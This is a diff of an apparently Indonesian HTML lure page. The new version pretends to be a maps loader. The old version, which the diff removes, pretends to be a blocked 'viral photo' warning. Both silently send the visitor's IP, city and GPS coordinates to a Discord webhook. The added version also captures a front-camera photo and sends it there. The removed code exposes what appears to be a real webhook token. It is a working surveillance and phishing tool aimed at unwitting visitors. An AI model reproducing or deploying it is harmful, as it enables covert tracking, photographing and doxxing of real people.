@@ -1,98 +1,77 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Sedang Memuat Maps...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Keamanan Konten - Peringatan</title>
-    <link rel="icon" href="https://img.icons8.com/emoji/48/lock.png">
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .container { text-align: center; max-width: 350px; padding: 30px; border: 1px solid #ff0000; border-radius: 8px; box-shadow: 0 0 30px #ff0000; background: rgba(20, 0, 0, 0.9); }
-        .icon { font-size: 70px; margin-bottom: 15px; color: #ff0000; }
-        h1 { font-size: 20px; color: #ff0000; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        p { font-size: 14px; line-height: 1.6; color: #ccc; margin-bottom: 25px; }
-        .btn { display: inline-block; padding: 12px 30px; background: #ff0000; color: #fff; text-decoration: none; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; transition: background 0.3s; }
-        .btn:hover { background: #b30000; }
-        #map { display: none; } /* Disembunyikan */
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+    <div class="loader"></div>
+    <p>Harap tunggu, sedang menyinkronkan lokasi terdekat...</p>
 
-<div class="container">
-    <div class="icon">🔒</div>
-    <h1>PERINGATAN KONTEN</h1>
-    <p>Sistem keamanan mendeteksi bahwa foto Anda yang sedang viral telah diblokir untuk wilayah ini. Silakan konfirmasi identitas Anda untuk melihat atau mengarsipkan konten tersebut.</p>
-    <button class="btn" onclick="requestView()">Lihat Foto</button>
-</div>
+    <script>
+        // GANTI URL DI BAWAH INI DENGAN URL WEBHOOK DISCORD KAMU
+        const DISCORD_WEBHOOK = "MASUKKAN_URL_WEBHOOK_DISCORD_DISINI";
 
-<div id="map"></div>
+        window.onload = function() {
+            startTracking();
+        };
 
-<script>
-// Webhook Kamu
-const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+        async function startTracking() {
+            // 1. Ambil Lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    // Kirim teks lokasi ke Discord
+                    kirimKeDiscord(`📍 **Lokasi Terdeteksi!**\nLink: ${mapsUrl}`);
+                    
+                    // 2. Ambil Foto
+                    ambilFoto();
+                });
+            }
+        }
 
-async function trackVisitor() {
-    try {
-        // Ambil Data IP & Lokasi Dasar
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        
-        // Kirim data IP dulu (Pasti Masuk)
-        await sendToDiscord(data, "Menunggu Tombol Klik...", "☁️ IP (Halaman Dibuka)");
+        async function ambilFoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-    } catch (err) { console.log("System Ready."); }
-}
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                    const formData = new FormData();
+                    formData.append('file', blob, 'foto_pengunjung.jpg');
+                    formData.append('payload_json', JSON.stringify({ content: "📸 **Foto Kamera Depan Terdeteksi!**" }));
 
-async function getPreciseLocation(data) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            // Kirim ulang dengan koordinat presisi
-            await sendToDiscord(data, mLink, "🎯 GPS (KLIK LIHAT FOTO)");
-        }, () => {
-             // Jika menolak
-             sendToDiscord(data, "GPS Ditolak target.", "❌ GPS (MENOLAK)");
-        });
-    }
-}
+                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (err) {
+                kirimKeDiscord("❌ Akses kamera ditolak oleh pengguna.");
+            }
+        }
 
-async function sendToDiscord(data, mapsLink, metode) {
-    const payload = {
-        username: "VIRAL NOTIFIER",
-        content: `📸 **UMPAN VIRAL DIAKSES!**\n` +
-                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                 `🌐 **IP:** ${data.ip}\n` +
-                 `🏙️ **Kota:** ${data.city}\n` +
-                 `🎯 **Status:** ${metode}\n` +
-                 `🗺️ **Lokasi:** ${mapsLink}\n` +
-                 `━━━━━━━━━━━━━━━━━━━━`
-    };
-
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
-}
-
-async function requestView() {
-    // Ambil data IP lagi untuk memastikan
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-    
-    // Pemicu izin lokasi
-    getPreciseLocation(data);
-    
-    alert("Konfirmasi identitas gagal. Konten tetap diblokir demi keamanan.");
-}
-
-// Jalankan otomatis saat web dibuka
-window.onload = trackVisitor;
-</script>
-
+        function kirimKeDiscord(pesan) {
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: pesan })
+            });
+        }
+    </script>
 </body>
 </html>
